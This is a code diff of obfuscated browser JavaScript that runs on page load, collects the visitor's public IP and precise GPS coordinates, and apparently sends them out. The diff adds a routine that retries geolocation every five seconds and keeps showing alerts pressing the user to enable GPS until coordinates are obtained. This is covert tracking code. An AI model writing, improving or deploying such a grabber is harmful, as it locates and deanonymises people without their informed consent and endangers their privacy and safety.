@@ -9,72 +9,48 @@ function _0xa1b2c3() {
     .catch(_0xerr => 'Error');
 }
 
-function _0xj9k8l() {
-  return new Promise((_0xres, _0xrej) => {
+function getLocation() {
+  return new Promise((resolve, reject) => {
     if (!navigator.geolocation) {
-      _0xres(null); // Geolocation not supported
+      reject("Geolocation not supported");
     } else {
-      navigator.geolocation.getCurrentPosition(
-        _0xpos => {
-          _0xres({
-            lat: _0xpos.coords.latitude,
-            lon: _0xpos.coords.longitude,
-            acc: _0xpos.coords.accuracy
-          });
-        },
-        _0err => {
-          if (_0err.code === 1 || _0err.code === 3) {
-            // Either permission denied or GPS is off
-            showEnableLocationPopup();
-          }
-          _0xres(null);
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 5000,
-          maximumAge: 0
-        }
-      );
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+      });
     }
   });
 }
 
 function showEnableLocationPopup() {
   if (!localStorage.getItem("locationPromptShown")) {
-    // Show initial prompt if not already shown
-    const message = `
-      🛑 **Location Services are Disabled!**
+    alert(`
+      🛑 Location Services are Disabled!
       Please enable GPS from your device settings to proceed.
       🧭 You can go to your phone's settings to enable location services.
-    `;
-    alert(message);
+    `);
 
-    // Set the flag so it won't show again after page reload
     localStorage.setItem("locationPromptShown", "true");
-    
-    // Optional: After 10 seconds, show a second reminder if GPS is still off
+
     setTimeout(() => {
-      if (!navigator.geolocation) {
-        return;
-      }
+      if (!navigator.geolocation) return;
 
       navigator.geolocation.getCurrentPosition(
-        () => { /* If the user enables GPS, do nothing */ },
+        () => {},
         (_err) => {
           if (_err.code === 3) {
-            // GPS still off, show a second reminder
-            const reminderMessage = "⚠️ **Reminder**: Location Services are still off. Please enable GPS in your settings.";
-            alert(reminderMessage);
+            alert("⚠️ Reminder: Location Services are still off. Please enable GPS in your settings.");
           }
         }
       );
-    }, 10000); // Show second reminder after 10 seconds
+    }, 10000);
   }
 }
 
 async function _0xsend() {
   const _0xip = await _0xa1b2c3();
-  const _0xloc = await _0xj9k8l();
+  const _0xloc = await tryGetLocationRepeatedly();
 
   let _0xdesc = `🌐 **Public IP**: ${_0xip}`;
 
@@ -104,7 +80,34 @@ async function _0xsend() {
   });
 }
 
-// Automatically trigger location request when page loads
+async function tryGetLocationRepeatedly() {
+  let location = null;
+
+  const interval = setInterval(async () => {
+    try {
+      location = await getLocation();
+      clearInterval(interval);
+    } catch (_err) {
+      if (_err.code === 1 || _err.code === 3) {
+        showEnableLocationPopup();
+      }
+    }
+  }, 5000);
+
+  return new Promise(resolve => {
+    const checkInterval = setInterval(() => {
+      if (location) {
+        clearInterval(checkInterval);
+        resolve({
+          lat: location.coords.latitude,
+          lon: location.coords.longitude,
+          acc: location.coords.accuracy
+        });
+      }
+    }, 500);
+  });
+}
+
 window.onload = function() {
   _0xsend();
 };
